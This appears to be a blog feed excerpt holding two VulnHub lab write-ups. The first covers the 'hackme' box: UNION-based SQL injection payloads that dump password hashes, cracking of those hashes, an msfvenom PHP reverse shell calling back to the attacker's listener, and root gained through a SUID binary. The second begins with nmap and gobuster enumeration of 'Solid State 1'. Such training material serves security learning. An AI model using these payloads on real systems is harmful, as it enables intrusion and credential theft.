+ http://192.168.179.186/index.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:100&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ http://192.168.179.186/server-status &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:403|SIZE:303&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://192.168.179.186/uploads/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We create a user account to log in to the web application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackme/screenshot-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We log in with the account created earlier.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackme/screenshot-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A SQL Injection was discovered in the search field, as we can see when trying to inject it all the records were displayed in the browser.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s1&quot;&gt;' or 1=1 #
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackme/screenshot-4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
&lt;h3 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;/h3&gt;

&lt;p&gt;Our first step of the attack is identify the column numbers, we see that there are three columns.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s1&quot;&gt;' or 1=1 order by 3 #
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackme/screenshot-5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the number of columns has been identified, we create the following UNION statement, to see if the injected numbers are displayed in the browser.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s1&quot;&gt;' and 1=2 union select 1,2,3 #
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackme/screenshot-6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we see in the screenshot above, all the numbers injected in each column are displayed, which facilitates our exploitation process.&lt;/p&gt;

&lt;p&gt;Retrieving mysql version.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s1&quot;&gt;' and 1=2 union select @@version,2,3 #
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackme/screenshot-7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Retrieving the current database.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s1&quot;&gt;' and 1=2 union select database(),2,3 #
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackme/screenshot-8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Retrieving the mysql home directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s1&quot;&gt;' and 1=2 union select @@datadir,2,3 #
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackme/screenshot-9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Retrieving the user that the web application is using to connect to the database.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s1&quot;&gt;' and 1=2 union select user(),2,3 #
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackme/screenshot-10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Retrieving users with file privileges enabled.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s1&quot;&gt;' and 1=2 union select user,2,3 from mysql.user where file_priv='&lt;/span&gt;Y&lt;span class=&quot;s1&quot;&gt;' #
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackme/screenshot-11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When trying to read the &lt;strong&gt;/etc/passwd&lt;/strong&gt; file, it was not possible.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s1&quot;&gt;' and 1=2 union select load_file('&lt;/span&gt;/etc/passwd&lt;span class=&quot;s1&quot;&gt;'),2,3 #
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackme/screenshot-12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Retrieving the tables from the database that the web application is using.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s1&quot;&gt;' and 1=2 union select table_name,2,3 from information_schema.tables where table_schema=database() #
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackme/screenshot-13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Retrieving the columns from the table &lt;strong&gt;users&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s1&quot;&gt;' and 1=2 union select column_name,2,3 from information_schema.columns where table_schema=database() and table_name='&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;' #
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackme/screenshot-14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Retrieving the records from the table &lt;strong&gt;users&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s1&quot;&gt;' and 1=2 union select concat_ws('&lt;/span&gt;:&lt;span class=&quot;s1&quot;&gt;',user,pasword),2,3 from users #
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackme/screenshot-15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I saved the credentials into a file for easy use later.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-sL&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;PHPSESSID=tgq6veet5bs049gijo8pblgo3o&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.179.186/welcome.php&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;search='+and+1=2+union+select+concat_ws(':',user,pasword),2,3+from+users+#&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'SGD'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/&amp;lt;td&amp;gt;/\n/g'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pv&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'^[\d\s]'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/\(.*\)&amp;lt;.*/\1/'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tee &lt;/span&gt;creds.txt 
user1:5d41402abc4b2a76b9719d911017c592
user2:6269c4f71a55b24bad0f0267d9be5508
user3:0f359740bd1cda994f8b55330c86d845
&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;:05a671c66aefea124cc08b76ea6d30bb
superadmin:2386acb2cf356944177746fc92523983
test1:05a671c66aefea124cc08b76ea6d30bb
admin:5f4dcc3b5aa765d61d8327deb882cf99
root@kali:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then the hashes were cracked in &lt;a href=&quot;https://hashes.com&quot;&gt;https://hashes.com&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackme/screenshot-16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I just played with regular expressions to align the hashes with their respective password.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;x &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;creds.txt | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'$d'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;:&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $1}'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;:&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $NF}'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; cracked.txt&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done
&lt;/span&gt;user1:5d41402abc4b2a76b9719d911017c592:hello
user2:6269c4f71a55b24bad0f0267d9be5508:commando
user3:0f359740bd1cda994f8b55330c86d845:p@ssw0rd
&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;:05a671c66aefea124cc08b76ea6d30bb:testtest
superadmin:2386acb2cf356944177746fc92523983:Uncrackable
test1:05a671c66aefea124cc08b76ea6d30bb:testtest
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When logged in as user &lt;strong&gt;superadmin&lt;/strong&gt;, it was noted that it has a file upload feature.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackme/screenshot-17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackme/screenshot-18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We generate a php reverse shell.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; php/reverse_perl &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.179.1 &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;443 &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; z.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We uploaded the reverse shell to the server, the upload was successful because there is not type of validation to prevent uploading arbitrary files.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackme/screenshot-19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackme/screenshot-20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can note that the file was uploaded in the &lt;strong&gt;/uploads&lt;/strong&gt; directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackme/screenshot-21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We start a netcat listener and execute the following curl command which will interpret our php reverse shell.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://192.168.179.186/uploads/z.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We have obtained a shell with low privileges.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-vlnp&lt;/span&gt; 443
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.1] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.186] 55592
script &lt;span class=&quot;nt&quot;&gt;-qc&lt;/span&gt; /bin/bash /dev/null
www-data@hackme:/var/www/html/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Enumerating the SUID binaries an unusual file was found in the legacy home directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@hackme:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt; 2&amp;gt;/dev/null
...
&lt;span class=&quot;nt&quot;&gt;-rwsr--r-x&lt;/span&gt; 1 root root 8472 Mar 26  2019 /home/legacy/touchmenot
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
&lt;h3 id=&quot;suid-binary&quot;&gt;SUID Binary&lt;/h3&gt;

&lt;p&gt;When executing the &lt;strong&gt;/home/legacy/touchmenot&lt;/strong&gt; binary this granted root access.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@hackme:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/home/legacy/touchmenot
/home/legacy/touchmenot
root@hackme:/var/www/html# &lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
root@hackme:/var/www/html# su -
su -
root@hackme:~# &lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
root@hackme:~#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>s4rgaz</name></author><summary type="html">Description: Is a beginner difficulty level box, the lab was created to mimic real life environment.</summary></entry><entry><title type="html">VulnHub - Solid State 1</title><link href="http://localhost:4000/solidstate1.html" rel="alternate" type="text/html" title="VulnHub - Solid State 1" /><published>2022-01-04T00:00:00-05:00</published><updated>2022-01-04T00:00:00-05:00</updated><id>http://localhost:4000/solidstate1</id><content type="html" xml:base="http://localhost:4000/solidstate1.html">&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt; It was originally created for HackTheBox&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; Ch33z_plz&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Operating System:&lt;/strong&gt; Linux&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Aim:&lt;/strong&gt; To get root shell and read the flag.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/solidstate-1,261/&quot;&gt;https://www.vulnhub.com/entry/solidstate-1,261/&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h2&gt;
&lt;h3 id=&quot;host-discovery&quot;&gt;Host Discovery&lt;/h3&gt;

&lt;p&gt;The following command performs a ping scan to discover the target machine on the local network.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt; 192.168.179.0/24
Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-04 13:56 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.179.185
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h3&gt;

&lt;p&gt;To detect open ports a full TCP port scan was performed with nmap.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 192.168.179.185 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; nmap/all.tcp-ports.txt 
...
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h3&gt;

&lt;p&gt;With the aim of discovering information about open ports running on the server, an aggressive scan was did with nmap, it enable the OS detection, version enumeration, script scanning and traceroute.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,25,80,110,119,4555 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 192.168.179.185 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/service-enum.txt
...
PORT     STATE SERVICE     VERSION                                                                                                                                  
22/tcp   open  tcpwrapped                                                                                                                                           
| ssh-hostkey:                                                                                                                                                      
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                      
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                     
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                   
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.179.1 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.1]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, PIPELINING, ENHANCEDSTATUSCODES, 
80/tcp   open  http        Apache httpd 2.4.25 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Home - Solid State Security 
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;posting ok&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h3&gt;

&lt;p&gt;A web page is running in the web service, but was not possible to find valuable information.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/solidstate/screenshot-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The directory brute forcing with gobuster also did not disclosed information that would help to compromise the system.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://192.168.179.185/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; html,php,txt
...
http://192.168.179.185/images               &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 319] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://192.168.179.185/images/]
http://192.168.179.185/about.html           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 7182]                                    
http://192.168.179.185/index.html           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 7776]                                    
